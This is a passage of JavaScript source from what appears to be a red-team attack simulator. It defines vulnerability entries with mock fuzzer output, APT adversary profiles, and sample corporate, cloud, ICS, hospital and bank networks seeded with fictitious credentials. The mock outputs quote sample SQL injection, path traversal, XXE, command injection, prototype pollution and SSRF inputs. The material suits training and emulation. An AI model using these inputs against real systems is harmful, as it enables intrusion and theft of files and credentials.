  { name: 'SSRF via Internal PDF Generator', type: 'ssrf', cvss: 8.5, reliability: 0.45, service: 'http', desc: 'The PDF export feature fetches user-supplied URLs for embedding. By providing internal URLs, the attacker can read internal services including cloud metadata.', output: '[FUZZ] Testing URL parameter in /api/export/pdf\n[+] http://169.254.169.254/latest/meta-data/ returned in PDF\n[+] Internal service at http://10.0.1.40:8080/admin accessible\n[*] SSRF confirmed — can reach internal network' },
  { name: 'Insecure Deserialization in Message Queue Consumer', type: 'rce', cvss: 9.8, reliability: 0.3, service: 'java', desc: 'The application consumes serialized Java objects from a message queue without validation. Crafting a malicious serialized object achieves remote code execution.', output: '[FUZZ] Injecting ysoserial payloads into message queue\n[+] CommonsCollections6 gadget chain executed\n[+] DNS callback received from target\n[*] Blind RCE confirmed via out-of-band channel' },
  { name: 'SQL Injection in Custom Reporting Engine', type: 'data_access', cvss: 8.6, reliability: 0.55, service: 'http', desc: 'The custom reporting API accepts a filter parameter that is directly interpolated into a SQL query. Time-based blind injection confirmed.', output: '[FUZZ] Testing filter parameter with SQLi payloads\n[+] filter=1 AND SLEEP(5) — response delayed 5s\n[+] Time-based blind SQL injection confirmed\n[*] DBMS: MySQL 8.0 — extracting schema' },
  { name: 'Path Traversal in File Download Endpoint', type: 'info_disclosure', cvss: 7.5, reliability: 0.6, service: 'http', desc: 'The /download endpoint uses a filename parameter vulnerable to path traversal. Double URL-encoding bypasses the input filter.', output: '[FUZZ] Testing path traversal sequences\n[+] /download?file=%252e%252e%252fetc%252fpasswd returned /etc/passwd\n[+] Filter bypass via double URL encoding\n[*] Can read arbitrary files as www-data' },
  { name: 'Race Condition in Token Refresh', type: 'auth_bypass', cvss: 8.0, reliability: 0.25, service: 'http', desc: 'Sending multiple simultaneous token refresh requests creates a race condition that generates valid tokens for other users.', output: '[FUZZ] Sending 50 concurrent POST /auth/refresh requests\n[+] Race condition detected — received token for user_id=1 (admin)\n[*] TOCTOU vulnerability in session management\n[*] Reliability: VERY LOW — requires precise timing' },
  { name: 'XML External Entity in SOAP Endpoint', type: 'info_disclosure', cvss: 7.5, reliability: 0.5, service: 'http', desc: 'A legacy SOAP endpoint processes XML with external entity resolution enabled, allowing file read and SSRF.', output: '[FUZZ] Sending XXE payload to /ws/api\n[+] <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>\n[+] Shadow file contents returned in SOAP fault message\n[*] XXE confirmed — can read local files and reach internal services' },
  { name: 'Command Injection via Diagnostic Endpoint', type: 'rce', cvss: 9.8, reliability: 0.45, service: 'http', desc: 'A hidden /debug/ping endpoint passes user input directly to a system shell command without sanitization.', output: '[FUZZ] Discovered /debug/ping endpoint via directory brute force\n[+] host=127.0.0.1;id returned: uid=0(root) gid=0(root)\n[*] Direct command injection as root\n[*] No input sanitization on diagnostic endpoint' },
  { name: 'Prototype Pollution Leading to RCE', type: 'rce', cvss: 9.0, reliability: 0.3, service: 'http', desc: 'A Node.js API merges user-supplied JSON into internal objects without sanitization. Polluting __proto__ with a crafted payload achieves code execution via child_process.', output: '[FUZZ] Sending {"__proto__":{"shell":"node","NODE_OPTIONS":"--require /proc/self/environ"}} to POST /api/settings\n[+] Prototype pollution successful\n[+] Next spawned child process executes attacker payload\n[*] RCE confirmed on next server operation' },
];

// ============================================================================
// APT / ADVERSARY PROFILES FOR EMULATION MODE
// ============================================================================
const APT_PROFILES = [
  {
    name: 'APT29 / Cozy Bear', nation: 'Russia', targets: ['government', 'think tanks', 'healthcare'],
    ttps: { initialAccess: ['spearphishing_link', 'supply_chain'], execution: ['powershell', 'wmi'], persistence: ['registry_run', 'scheduled_task', 'wmi_subscription'], privesc: ['token_manipulation', 'uac_bypass'], defense: ['obfuscation', 'timestomping', 'process_injection'], credAccess: ['mimikatz', 'kerberoast'], lateral: ['winrm', 'psexec', 'rdp'], c2: ['https_beacon', 'domain_fronting'], exfil: ['https_post', 'cloud_storage'] },
    tools: ['Cobalt Strike', 'WellMess', 'EnvyScout', 'BoomBox', 'NativeZone'],
    speed: 'slow_and_careful', stealth: 0.8,
    campaign: 'SolarWinds SUNBURST (2020): Trojanized Orion update -> SUNBURST backdoor -> TEARDROP loader -> Cobalt Strike -> AD compromise -> email exfiltration. Dwell time: 9+ months.',
    description: 'Highly sophisticated, patient, focuses on stealth and long-term access. Known for SolarWinds SUNBURST campaign.'
  },
  {
    name: 'APT28 / Fancy Bear', nation: 'Russia', targets: ['military', 'government', 'media'],
    ttps: { initialAccess: ['spearphishing_attachment', 'exploit_public_app'], execution: ['powershell', 'cmd'], persistence: ['registry_run', 'bootkit'], privesc: ['kernel_exploit', 'token_manipulation'], defense: ['rootkit', 'code_signing'], credAccess: ['mimikatz', 'keylogger'], lateral: ['pass_the_hash', 'psexec'], c2: ['https_beacon', 'dns_tunneling'], exfil: ['https_post', 'email'] },
    tools: ['X-Agent', 'X-Tunnel', 'Sofacy', 'Zebrocy', 'LoJax'],
    speed: 'aggressive', stealth: 0.5,
    campaign: 'DNC Hack (2016): Spearphishing -> X-Agent implant -> credential harvesting -> lateral movement -> email archive exfiltration. Also responsible for LoJax UEFI rootkit.',
    description: 'Aggressive and noisy compared to APT29. Known for DNC hack, Olympic Destroyer misdirection.'
  },
  {
    name: 'Lazarus Group', nation: 'North Korea', targets: ['financial', 'cryptocurrency', 'defense'],
    ttps: { initialAccess: ['spearphishing_attachment', 'watering_hole'], execution: ['powershell', 'javascript'], persistence: ['scheduled_task', 'service_creation'], privesc: ['kernel_exploit'], defense: ['process_injection', 'obfuscation'], credAccess: ['hashdump', 'keylogger'], lateral: ['pass_the_hash', 'ssh'], c2: ['https_beacon', 'custom_protocol'], exfil: ['https_post', 'steganography'] },
    tools: ['FALLCHILL', 'Bankshot', 'AppleJeus', 'DTrack', 'BLINDINGCAN'],
    speed: 'moderate', stealth: 0.6,
    campaign: 'Bangladesh Bank (2016): Compromised SWIFT terminals -> submitted 35 fraudulent transfer requests -> $81M stolen. Also: WannaCry ransomware, Sony Pictures wiper.',
    description: 'Financially motivated. Known for Bangladesh Bank SWIFT heist ($81M), WannaCry, Sony Pictures hack.'
  },
  {
    name: 'Volt Typhoon', nation: 'China', targets: ['critical_infrastructure', 'telecom', 'government'],
    ttps: { initialAccess: ['exploit_public_app'], execution: ['living_off_the_land', 'cmd', 'powershell'], persistence: ['web_shell', 'scheduled_task'], privesc: ['token_manipulation'], defense: ['living_off_the_land', 'log_clearing'], credAccess: ['mimikatz', 'ntds_dit'], lateral: ['winrm', 'psexec', 'rdp'], c2: ['proxy_chains', 'living_off_the_land'], exfil: ['smb_staging', 'archive_and_exfil'] },
    tools: ['LOLBins only', 'certutil', 'netsh', 'wmic', 'ntdsutil'],
    speed: 'slow_and_careful', stealth: 0.9,
    campaign: 'US Critical Infrastructure (2023-present): Fortinet/Ivanti exploits -> LOTL -> AD compromise -> pre-positioned in water, energy, telecom, transportation. No custom malware deployed.',
    description: 'Pre-positions in US critical infrastructure. Exclusively uses living-off-the-land techniques. Extremely difficult to detect.'
  },
  {
    name: 'Scattered Spider', nation: 'USA/UK', targets: ['telecom', 'tech', 'hospitality', 'finance'],
    ttps: { initialAccess: ['social_engineering', 'sim_swap', 'mfa_fatigue'], execution: ['powershell', 'python'], persistence: ['oauth_app', 'mfa_manipulation'], privesc: ['cloud_iam_escalation'], defense: ['cloud_native_tools'], credAccess: ['phishing', 'help_desk_social_eng'], lateral: ['cloud_console', 'okta_admin'], c2: ['legitimate_services', 'slack', 'teams'], exfil: ['cloud_storage', 'email'] },
    tools: ['Okta admin abuse', 'Azure AD', 'AWS IAM', 'social engineering'],
    speed: 'aggressive', stealth: 0.4,
    campaign: 'MGM/Caesars (2023): Social engineered IT help desk -> Okta admin access -> deployed BlackCat ransomware -> $15M+ impact. Dwell time: hours, not days.',
    description: 'Young threat actors. Known for MGM/Caesars casino breaches. Specializes in social engineering help desks and identity provider abuse.'
  },
  {
    name: 'LockBit 3.0', nation: 'Russia (affiliate model)', targets: ['any', 'healthcare', 'education', 'government'],
    ttps: { initialAccess: ['exploit_public_app', 'rdp_brute'], execution: ['cmd', 'powershell'], persistence: ['service_creation', 'scheduled_task'], privesc: ['uac_bypass', 'token_manipulation'], defense: ['disable_av', 'safe_mode_boot'], credAccess: ['mimikatz', 'hashdump', 'lsass_dump'], lateral: ['psexec', 'wmi', 'gpo_deployment'], c2: ['cobalt_strike', 'https_beacon'], exfil: ['rclone', 'mega_upload'] },
    tools: ['StealBit', 'Cobalt Strike', 'Mimikatz', 'rclone', 'PsExec'],
    speed: 'fast', stealth: 0.3,
    campaign: 'Typical LockBit operation: RDP brute or VPN exploit -> Cobalt Strike -> Mimikatz -> StealBit exfil -> GPO-deployed encryption across domain. Average dwell: 4-14 days.',
    description: 'Most prolific ransomware gang. Double extortion (encrypt + leak). Known for automated propagation via Group Policy.'
  },
];

// ============================================================================
// ENVIRONMENT TEMPLATES
// ============================================================================
const ENV_TEMPLATES = {
  corporate: {
    name: 'Corporate Network',
    desc: 'Active Directory domain with DMZ, web servers, database, workstations, and firewall',
    hosts: [
      { id: 'fw', name: 'FW-01', ip: '10.0.0.1', os: 'FortiOS 7.2', role: 'Firewall', x: 400, y: 30, services: [{ name: 'fortigate', port: 443, version: '7.x' }], controls: ['ips', 'url_filter'], value: 9, segment: 'perimeter', creds: [] },
      { id: 'dc01', name: 'DC-01', ip: '10.0.1.10', os: 'Windows Server 2019', role: 'Domain Controller', x: 400, y: 180, services: [{ name: 'ldap', port: 389, version: '*' }, { name: 'kerberos', port: 88, version: '*' }, { name: 'smb', port: 445, version: '3.0' }, { name: 'dns', port: 53, version: '*' }, { name: 'netlogon', port: 135, version: '*' }], controls: ['av', 'siem_agent'], value: 10, segment: 'servers', creds: [{ user: 'Administrator', hash: '7f1c3b9d8e2a4c5f6b7d8e9f0a1b2c3d', domain: 'CORP' }] },
      { id: 'web01', name: 'WEB-01', ip: '10.0.0.20', os: 'Ubuntu 22.04', role: 'Web Server', x: 200, y: 180, services: [{ name: 'http', port: 80, version: '*' }, { name: 'http', port: 443, version: '*' }, { name: 'ssh', port: 22, version: '8.x' }], controls: ['waf'], value: 6, segment: 'dmz', creds: [{ user: 'www-data', type: 'service' }] },
      { id: 'app01', name: 'APP-01', ip: '10.0.1.30', os: 'Ubuntu 20.04', role: 'Application Server', x: 250, y: 320, services: [{ name: 'java', port: 8080, version: '2.0-2.14.1' }, { name: 'ssh', port: 22, version: '8.x' }, { name: 'tomcat', port: 8443, version: '*' }], controls: [], value: 7, segment: 'servers', creds: [{ user: 'tomcat', pass: 'tomcat' }] },
      { id: 'db01', name: 'DB-01', ip: '10.0.1.40', os: 'Ubuntu 22.04', role: 'Database Server', x: 550, y: 320, services: [{ name: 'mysql', port: 3306, version: '5.x' }, { name: 'ssh', port: 22, version: '8.x' }], controls: [], value: 9, segment: 'servers', creds: [{ user: 'root', pass: '', type: 'mysql' }] },
      { id: 'mail01', name: 'MAIL-01', ip: '10.0.0.30', os: 'Windows Server 2019', role: 'Exchange Server', x: 600, y: 180, services: [{ name: 'exchange', port: 443, version: '2013-2019' }, { name: 'smtp', port: 25, version: '*' }, { name: 'smb', port: 445, version: '2.0' }], controls: ['av'], value: 8, segment: 'dmz', creds: [] },
      { id: 'ws01', name: 'WS-01', ip: '10.0.2.100', os: 'Windows 10', role: 'Workstation (IT Admin)', x: 150, y: 460, services: [{ name: 'smb', port: 445, version: '3.0' }, { name: 'rdp', port: 3389, version: '*' }], controls: ['edr', 'av'], value: 5, segment: 'workstations', creds: [{ user: 'admin', pass: 'P@ssw0rd2024!', domain: 'CORP' }] },
      { id: 'ws02', name: 'WS-02', ip: '10.0.2.101', os: 'Windows 10', role: 'Workstation (Finance)', x: 350, y: 460, services: [{ name: 'smb', port: 445, version: '3.0' }, { name: 'rdp', port: 3389, version: '*' }], controls: ['av'], value: 4, segment: 'workstations', creds: [{ user: 'j.smith', pass: 'Welcome1!', domain: 'CORP' }] },
      { id: 'ws03', name: 'WS-03', ip: '10.0.2.102', os: 'Windows 10', role: 'Workstation (HR)', x: 550, y: 460, services: [{ name: 'smb', port: 445, version: '3.0' }], controls: ['av'], value: 4, segment: 'workstations', creds: [] },
      { id: 'jenkins', name: 'CI-01', ip: '10.0.1.50', os: 'Ubuntu 20.04', role: 'Jenkins CI/CD', x: 100, y: 320, services: [{ name: 'jenkins', port: 8080, version: '*' }, { name: 'ssh', port: 22, version: '8.x' }], controls: [], value: 7, segment: 'servers', creds: [] },
      { id: 'backup', name: 'BKP-01', ip: '10.0.1.60', os: 'Ubuntu 22.04', role: 'Backup Server', x: 400, y: 400, services: [{ name: 'ssh', port: 22, version: '8.x' }, { name: 'nfs', port: 2049, version: '*' }, { name: 'ftp', port: 21, version: '*' }], controls: [], value: 8, segment: 'servers', creds: [] },
    ],
    connections: [
      { from: 'fw', to: 'web01', bidir: false, rules: ['80', '443'] },
      { from: 'fw', to: 'mail01', bidir: false, rules: ['443', '25'] },
      { from: 'web01', to: 'app01', bidir: true, rules: ['8080'] },
      { from: 'app01', to: 'db01', bidir: true, rules: ['3306'] },
      { from: 'dc01', to: 'ws01', bidir: true, rules: ['*'] },
      { from: 'dc01', to: 'ws02', bidir: true, rules: ['*'] },
      { from: 'dc01', to: 'ws03', bidir: true, rules: ['*'] },
      { from: 'dc01', to: 'mail01', bidir: true, rules: ['*'] },
      { from: 'dc01', to: 'app01', bidir: true, rules: ['*'] },
      { from: 'dc01', to: 'jenkins', bidir: true, rules: ['*'] },
      { from: 'dc01', to: 'backup', bidir: true, rules: ['*'] },
      { from: 'ws01', to: 'jenkins', bidir: true, rules: ['8080', '22'] },
      { from: 'ws01', to: 'db01', bidir: true, rules: ['3306'] },
      { from: 'backup', to: 'db01', bidir: true, rules: ['3306'] },
      { from: 'backup', to: 'dc01', bidir: true, rules: ['*'] },
    ],
  },
  cloud: {
    name: 'Cloud Infrastructure (AWS)',
    desc: 'AWS environment with EC2, S3, Lambda, IAM, RDS, and VPC',
    hosts: [
      { id: 'alb', name: 'ALB-01', ip: '52.1.2.3', os: 'AWS ALB', role: 'Load Balancer', x: 400, y: 30, services: [{ name: 'http', port: 443, version: '*' }], controls: ['waf'], value: 5, segment: 'public', creds: [] },
      { id: 'ec2web', name: 'EC2-WEB', ip: '10.0.1.10', os: 'Amazon Linux 2', role: 'Web Application', x: 250, y: 180, services: [{ name: 'http', port: 8080, version: '*' }, { name: 'ssh', port: 22, version: '8.x' }, { name: 'imds', port: 80, version: 'v1' }], controls: [], value: 6, segment: 'private', creds: [] },
      { id: 'ec2api', name: 'EC2-API', ip: '10.0.1.20', os: 'Ubuntu 22.04', role: 'API Server', x: 550, y: 180, services: [{ name: 'spring', port: 8080, version: '5.3.0-5.3.17' }, { name: 'ssh', port: 22, version: '8.x' }, { name: 'imds', port: 80, version: 'v1' }], controls: [], value: 7, segment: 'private', creds: [] },
      { id: 'rds', name: 'RDS-01', ip: '10.0.2.10', os: 'MySQL 8.0 (RDS)', role: 'Database', x: 400, y: 320, services: [{ name: 'mysql', port: 3306, version: '*' }], controls: [], value: 9, segment: 'data', creds: [{ user: 'admin', pass: 'RdsP@ss2024', type: 'mysql' }] },
      { id: 's3', name: 'S3-BACKUP', ip: 'corp-backups.s3', os: 'S3 Bucket', role: 'Storage', x: 150, y: 320, services: [{ name: 's3', port: 443, version: '*' }], controls: [], value: 8, segment: 'storage', creds: [] },
      { id: 'lambda', name: 'LAMBDA-01', ip: 'lambda.aws', os: 'Lambda (Python 3.9)', role: 'Serverless', x: 600, y: 320, services: [{ name: 'http', port: 443, version: '*' }], controls: [], value: 5, segment: 'compute', creds: [] },
      { id: 'iam', name: 'IAM', ip: 'iam.aws', os: 'AWS IAM', role: 'Identity', x: 400, y: 460, services: [], controls: [], value: 10, segment: 'management', creds: [] },
    ],
    connections: [
      { from: 'alb', to: 'ec2web', bidir: false, rules: ['8080'] },
      { from: 'alb', to: 'ec2api', bidir: false, rules: ['8080'] },
      { from: 'ec2web', to: 'rds', bidir: true, rules: ['3306'] },
      { from: 'ec2api', to: 'rds', bidir: true, rules: ['3306'] },
      { from: 'ec2web', to: 's3', bidir: true, rules: ['443'] },
      { from: 'ec2api', to: 'lambda', bidir: true, rules: ['443'] },
      { from: 'lambda', to: 'rds', bidir: true, rules: ['3306'] },
    ],
  },
  ics: {
    name: 'ICS/SCADA Network',
    desc: 'Industrial control system with PLCs, HMIs, historian, and engineering workstations',
    hosts: [
      { id: 'icsfw', name: 'ICS-FW', ip: '192.168.1.1', os: 'FortiGate', role: 'ICS Firewall', x: 400, y: 30, services: [], controls: ['ips'], value: 9, segment: 'perimeter', creds: [] },
      { id: 'historian', name: 'HIST-01', ip: '192.168.1.10', os: 'Windows Server 2016', role: 'Data Historian', x: 200, y: 180, services: [{ name: 'mssql', port: 1433, version: '*' }, { name: 'http', port: 80, version: '*' }, { name: 'smb', port: 445, version: '1.0' }], controls: ['av'], value: 7, segment: 'ics_dmz', creds: [{ user: 'sa', pass: 'sa123456', type: 'mssql' }] },
      { id: 'hmi01', name: 'HMI-01', ip: '192.168.2.20', os: 'Windows 10 LTSC', role: 'HMI Station', x: 200, y: 320, services: [{ name: 'rdp', port: 3389, version: '7.x' }, { name: 'smb', port: 445, version: '1.0' }, { name: 'http', port: 80, version: '*' }], controls: [], value: 8, segment: 'ics_control', creds: [{ user: 'operator', pass: 'operator1' }] },
      { id: 'hmi02', name: 'HMI-02', ip: '192.168.2.21', os: 'Windows 7', role: 'HMI Station', x: 400, y: 320, services: [{ name: 'rdp', port: 3389, version: '7.x' }, { name: 'smb', port: 445, version: '1.0' }], controls: [], value: 8, segment: 'ics_control', creds: [] },
      { id: 'ews', name: 'EWS-01', ip: '192.168.2.30', os: 'Windows 10', role: 'Engineering Workstation', x: 600, y: 180, services: [{ name: 'smb', port: 445, version: '2.0' }, { name: 'rdp', port: 3389, version: '*' }], controls: [], value: 9, segment: 'ics_control', creds: [{ user: 'engineer', pass: 'Eng!neer2024', type: 'rdp' }] },
      { id: 'plc01', name: 'PLC-01', ip: '192.168.3.100', os: 'Siemens S7-1200', role: 'PLC (Pump Control)', x: 200, y: 460, services: [{ name: 'modbus', port: 502, version: '*' }, { name: 's7comm', port: 102, version: '*' }], controls: [], value: 10, segment: 'ics_field', creds: [] },
      { id: 'plc02', name: 'PLC-02', ip: '192.168.3.101', os: 'Allen-Bradley', role: 'PLC (Valve Control)', x: 400, y: 460, services: [{ name: 'modbus', port: 502, version: '*' }, { name: 'enip', port: 44818, version: '*' }], controls: [], value: 10, segment: 'ics_field', creds: [] },
      { id: 'rtu', name: 'RTU-01', ip: '192.168.3.110', os: 'SEL RTU', role: 'Remote Terminal Unit', x: 600, y: 460, services: [{ name: 'dnp3', port: 20000, version: '*' }], controls: [], value: 10, segment: 'ics_field', creds: [] },
    ],
    connections: [
      { from: 'icsfw', to: 'historian', bidir: false, rules: ['1433', '80'] },
      { from: 'historian', to: 'hmi01', bidir: true, rules: ['*'] },
      { from: 'historian', to: 'hmi02', bidir: true, rules: ['*'] },
      { from: 'historian', to: 'ews', bidir: true, rules: ['*'] },
      { from: 'hmi01', to: 'plc01', bidir: true, rules: ['502', '102'] },
      { from: 'hmi02', to: 'plc02', bidir: true, rules: ['502', '44818'] },
      { from: 'ews', to: 'plc01', bidir: true, rules: ['*'] },
      { from: 'ews', to: 'plc02', bidir: true, rules: ['*'] },
      { from: 'ews', to: 'rtu', bidir: true, rules: ['20000'] },
    ],
  },
  hospital: {
    name: 'Hospital Network',
    desc: 'Healthcare network with EMR, medical devices, imaging systems, and pharmacy',
    hosts: [
      { id: 'hfw', name: 'HFW-01', ip: '172.16.0.1', os: 'FortiGate', role: 'Hospital Firewall', x: 400, y: 30, services: [], controls: ['ips', 'url_filter'], value: 9, segment: 'perimeter', creds: [] },
      { id: 'hvpn', name: 'VPN-01', ip: '172.16.0.5', os: 'Ivanti Connect Secure', role: 'VPN Gateway', x: 200, y: 30, services: [{ name: 'ivanti', port: 443, version: 'Connect Secure' }], controls: [], value: 8, segment: 'perimeter', creds: [] },
      { id: 'had', name: 'HAD-01', ip: '172.16.1.10', os: 'Windows Server 2022', role: 'Domain Controller', x: 400, y: 180, services: [{ name: 'ldap', port: 389, version: '*' }, { name: 'kerberos', port: 88, version: '*' }, { name: 'smb', port: 445, version: '3.0' }, { name: 'dns', port: 53, version: '*' }], controls: ['av'], value: 10, segment: 'servers', creds: [{ user: 'Administrator', hash: 'aad3b435b51404eeaad3b435b51404ee', domain: 'HOSPITAL' }] },
      { id: 'hemr', name: 'EMR-01', ip: '172.16.1.20', os: 'Windows Server 2019', role: 'EMR Server', x: 250, y: 300, services: [{ name: 'http', port: 443, version: '*' }, { name: 'mssql', port: 1433, version: '*' }, { name: 'smb', port: 445, version: '2.0' }], controls: ['av'], value: 10, segment: 'servers', creds: [{ user: 'sa', pass: 'EMR@2024', type: 'mssql' }] },
      { id: 'hpacs', name: 'PACS-01', ip: '172.16.1.30', os: 'Ubuntu 20.04', role: 'PACS Imaging', x: 550, y: 300, services: [{ name: 'http', port: 8080, version: '*' }, { name: 'dicom', port: 4242, version: '*' }, { name: 'ssh', port: 22, version: '8.x' }], controls: [], value: 8, segment: 'servers', creds: [] },
      { id: 'hpharm', name: 'PHARM-01', ip: '172.16.1.40', os: 'Windows Server 2016', role: 'Pharmacy System', x: 400, y: 400, services: [{ name: 'http', port: 443, version: '*' }, { name: 'mssql', port: 1433, version: '*' }, { name: 'smb', port: 445, version: '1.0' }], controls: [], value: 9, segment: 'servers', creds: [] },
      { id: 'hnurse', name: 'NS-01', ip: '172.16.2.50', os: 'Windows 10', role: 'Nursing Station', x: 150, y: 460, services: [{ name: 'smb', port: 445, version: '3.0' }, { name: 'rdp', port: 3389, version: '*' }], controls: ['av'], value: 5, segment: 'clinical', creds: [{ user: 'nurse1', pass: 'Nurse2024!', domain: 'HOSPITAL' }] },
      { id: 'hiot1', name: 'MON-01', ip: '172.16.3.100', os: 'Embedded Linux', role: 'Patient Monitor', x: 100, y: 560, services: [{ name: 'http', port: 80, version: '*' }, { name: 'ssh', port: 22, version: '7.x' }, { name: 'hl7', port: 2575, version: '*' }], controls: [], value: 7, segment: 'iot', creds: [] },
      { id: 'hiot2', name: 'PUMP-01', ip: '172.16.3.101', os: 'Embedded RTOS', role: 'Infusion Pump', x: 300, y: 560, services: [{ name: 'http', port: 80, version: '*' }, { name: 'modbus', port: 502, version: '*' }], controls: [], value: 8, segment: 'iot', creds: [] },
      { id: 'hbackup', name: 'HBKP-01', ip: '172.16.1.60', os: 'Ubuntu 22.04', role: 'Backup Server', x: 600, y: 180, services: [{ name: 'ssh', port: 22, version: '8.x' }, { name: 'nfs', port: 2049, version: '*' }, { name: 'ftp', port: 21, version: '*' }], controls: [], value: 8, segment: 'servers', creds: [] },
    ],
    connections: [
      { from: 'hfw', to: 'hvpn', bidir: true, rules: ['443'] },
      { from: 'hfw', to: 'hemr', bidir: false, rules: ['443'] },
      { from: 'hvpn', to: 'had', bidir: true, rules: ['*'] },
      { from: 'had', to: 'hemr', bidir: true, rules: ['*'] },
      { from: 'had', to: 'hpacs', bidir: true, rules: ['*'] },
      { from: 'had', to: 'hpharm', bidir: true, rules: ['*'] },
      { from: 'had', to: 'hnurse', bidir: true, rules: ['*'] },
      { from: 'hemr', to: 'hpacs', bidir: true, rules: ['4242', '8080'] },
      { from: 'hemr', to: 'hpharm', bidir: true, rules: ['1433'] },
      { from: 'hnurse', to: 'hiot1', bidir: true, rules: ['80', '2575'] },
      { from: 'hnurse', to: 'hiot2', bidir: true, rules: ['80', '502'] },
      { from: 'hbackup', to: 'had', bidir: true, rules: ['*'] },
      { from: 'hbackup', to: 'hemr', bidir: true, rules: ['*'] },
    ],
  },
  financial: {
    name: 'Financial Institution',
    desc: 'Banking network with core banking, SWIFT, trading, ATM controller, and compliance',
    hosts: [
      { id: 'ffw', name: 'PA-FW', ip: '10.10.0.1', os: 'PAN-OS 11.1', role: 'Perimeter Firewall', x: 400, y: 30, services: [{ name: 'panos', port: 443, version: '10.x-11.x' }], controls: ['ips', 'url_filter', 'dlp'], value: 9, segment: 'perimeter', creds: [] },
      { id: 'fdmz', name: 'WEB-PORTAL', ip: '10.10.1.10', os: 'Ubuntu 22.04', role: 'Customer Portal', x: 200, y: 150, services: [{ name: 'http', port: 443, version: '*' }, { name: 'spring', port: 8080, version: '5.3.0-5.3.17' }, { name: 'ssh', port: 22, version: '8.x' }], controls: [], value: 7, segment: 'dmz', creds: [] },
      { id: 'fjump', name: 'JUMP-01', ip: '10.10.1.20', os: 'Ubuntu 22.04', role: 'Jump Box', x: 600, y: 150, services: [{ name: 'ssh', port: 22, version: '8.x' }], controls: ['siem_agent'], value: 6, segment: 'dmz', creds: [{ user: 'admin', type: 'ssh_key' }] },
      { id: 'fdc', name: 'FDC-01', ip: '10.10.2.5', os: 'Windows Server 2022', role: 'Domain Controller', x: 400, y: 270, services: [{ name: 'ldap', port: 389, version: '*' }, { name: 'kerberos', port: 88, version: '*' }, { name: 'smb', port: 445, version: '3.0' }, { name: 'dns', port: 53, version: '*' }, { name: 'netlogon', port: 135, version: '*' }], controls: ['av', 'siem_agent'], value: 10, segment: 'core', creds: [{ user: 'Administrator', hash: 'b87a75acfb1eb2c0d16ae931b73c59d7', domain: 'BANK' }] },
      { id: 'fcore', name: 'CORE-BANK', ip: '10.10.2.10', os: 'Windows Server 2022', role: 'Core Banking', x: 250, y: 380, services: [{ name: 'mssql', port: 1433, version: '*' }, { name: 'smb', port: 445, version: '3.0' }, { name: 'rdp', port: 3389, version: '*' }], controls: ['edr', 'siem_agent', 'av'], value: 10, segment: 'core', creds: [] },
      { id: 'fswift', name: 'SWIFT-GW', ip: '10.10.2.20', os: 'Windows Server 2019', role: 'SWIFT Gateway', x: 550, y: 380, services: [{ name: 'http', port: 443, version: '*' }, { name: 'smb', port: 445, version: '2.0' }], controls: ['av', 'siem_agent'], value: 10, segment: 'swift_zone', creds: [{ user: 'swiftadmin', pass: 'Sw1ft#2024', type: 'http' }] },
      { id: 'ftrade', name: 'TRADE-01', ip: '10.10.2.30', os: 'RHEL 8', role: 'Trading Platform', x: 150, y: 480, services: [{ name: 'http', port: 8443, version: '*' }, { name: 'ssh', port: 22, version: '8.x' }, { name: 'redis', port: 6379, version: '*' }], controls: ['siem_agent'], value: 9, segment: 'core', creds: [] },
      { id: 'fatm', name: 'ATM-CTL', ip: '10.10.3.10', os: 'Windows 10 LTSC', role: 'ATM Controller', x: 400, y: 510, services: [{ name: 'smb', port: 445, version: '1.0' }, { name: 'rdp', port: 3389, version: '7.x' }], controls: [], value: 8, segment: 'atm_zone', creds: [{ user: 'atmadmin', pass: 'ATM@2024' }] },
      { id: 'fcomp', name: 'COMPLY-01', ip: '10.10.2.40', os: 'Windows Server 2019', role: 'Compliance Server', x: 600, y: 480, services: [{ name: 'http', port: 443, version: '*' }, { name: 'smb', port: 445, version: '2.0' }, { name: 'elasticsearch', port: 9200, version: '*' }], controls: [], value: 7, segment: 'core', creds: [] },
      { id: 'fsiem', name: 'SIEM-01', ip: '10.10.2.50', os: 'Ubuntu 22.04', role: 'SIEM Server', x: 250, y: 560, services: [{ name: 'elasticsearch', port: 9200, version: '*' }, { name: 'http', port: 5601, version: '*' }, { name: 'ssh', port: 22, version: '8.x' }], controls: ['siem_agent'], value: 8, segment: 'core', creds: [] },
    ],
    connections: [
      { from: 'ffw', to: 'fdmz', bidir: false, rules: ['443'] },
      { from: 'ffw', to: 'fjump', bidir: false, rules: ['22'] },
      { from: 'fjump', to: 'fdc', bidir: true, rules: ['*'] },
      { from: 'fjump', to: 'fcore', bidir: true, rules: ['3389', '1433'] },
      { from: 'fjump', to: 'fcomp', bidir: true, rules: ['443'] },
      { from: 'fdc', to: 'fcore', bidir: true, rules: ['*'] },
      { from: 'fdc', to: 'fswift', bidir: true, rules: ['*'] },
      { from: 'fdc', to: 'ftrade', bidir: true, rules: ['*'] },
      { from: 'fdc', to: 'fatm', bidir: true, rules: ['*'] },
      { from: 'fdc', to: 'fcomp', bidir: true, rules: ['*'] },
      { from: 'fdc', to: 'fsiem', bidir: true, rules: ['*'] },
      { from: 'fcore', to: 'fswift', bidir: true, rules: ['443'] },
      { from: 'ftrade', to: 'fcore', bidir: true, rules: ['1433'] },
      { from: 'fcomp', to: 'fsiem', bidir: true, rules: ['9200'] },
    ],
  },
};

// ============================================================================
// AGENT COLORS & CONFIG
// ============================================================================
const AGENT_COLORS = { RECON: '#00e5ff', EXPLOIT: '#ff1744', LATERAL: '#ffd600', PERSIST: '#00e676', EXFIL: '#d500f9' };
const AGENT_NAMES = { RECON: 'RECON', EXPLOIT: 'EXPLOIT', LATERAL: 'LATERAL', PERSIST: 'PERSIST', EXFIL: 'EXFIL' };

// ============================================================================
// NODE STATUS COLORS
// ============================================================================
const STATUS_COLORS = { unknown: '#555', discovered: '#0288d1', scanned: '#00b0ff', exploited: '#ff1744', persisted: '#00e676', exfiltrated: '#d500f9' };

// ============================================================================
// HYDRA ENGINE — CORE SIMULATION
// ============================================================================
class HydraEngine {
  constructor() {
    this.hosts = [];
    this.connections = [];
    this.intel = { credentials: [], sessions: [], services: [], vulns: [], data: [] };
    this.log = [];
    this.comms = [];
    this.threatScore = 0;
    this.tick = 0;
    this.running = false;
    this.speed = 1;
    this.paused = false;
    this.agents = { RECON: true, EXPLOIT: true, LATERAL: true, PERSIST: true, EXFIL: true };
    this.onLog = null;
    this.onComm = null;
    this.onUpdate = null;
    this.stepTimer = null;
    this.completedPhases = new Set();
    this.ransomwareEnabled = false;
    this.ransomwareDone = false;
    this.c2Beacons = [];
    this.zerodays = [];
  }

  loadTemplate(key) {
